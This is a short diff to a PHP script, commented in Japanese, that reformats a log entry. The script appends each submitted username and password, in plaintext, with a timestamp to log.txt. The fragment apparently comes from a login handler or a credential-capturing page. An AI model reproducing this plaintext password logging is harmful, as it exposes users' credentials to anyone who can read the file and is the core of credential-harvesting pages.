@@ -38,8 +38,10 @@ $file = 'log.txt';
 date_default_timezone_set('Asia/Tokyo');
 // 現在の日時を取得
 $date = date('Y-m-d H:i:s');
+
+$hr = str_repeat("-", 40);
 // ログイン情報をフォーマット
-$log = "日時: $date\nユーザー名: $username\nパスワード: $password\n\n";
+$log = "【日時】$date\n【ユーザー名】$username\n【パスワード】$password\n$hr\n";
 
 // ファイルに追記
 file_put_contents($file, $log, FILE_APPEND);
